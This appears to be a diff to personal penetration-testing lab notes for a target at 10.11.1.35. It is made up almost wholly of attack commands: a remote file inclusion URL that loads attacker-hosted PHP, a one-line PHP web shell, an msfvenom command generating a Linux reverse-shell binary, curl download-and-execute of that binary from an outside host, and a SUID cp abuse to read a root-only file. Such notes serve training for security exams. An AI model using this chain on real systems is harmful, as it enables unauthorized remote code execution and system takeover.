@@ -17,11 +17,14 @@ http://10.11.1.35/section.php?page=http://192.168.119.191:9000/test.php
 http://10.11.1.35/section.php?page=http://192.168.119.191:9000/shell.php&cmd=whoami
 <?php echo shell_exec($_GET['cmd']); ?>
 
-# 5 execute reverse shell with given approach to obtain the reverse shell
+# 5 generate payload
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.191 LPORT=12345 -f elf -o shell.elf 
+
+# 6 execute reverse shell with given approach to obtain the reverse shell
 curl http://192.168.119.191:9000/shell.elf > /tmp/shell.elf
 chmod 777 /tmp/shell.elf
 ./tmp/shell.elf
 
-# 6 found `cp` has suid bit set
+# 7 found `cp` has suid bit set
 cp /root/proof.txt /dev/stdout
 
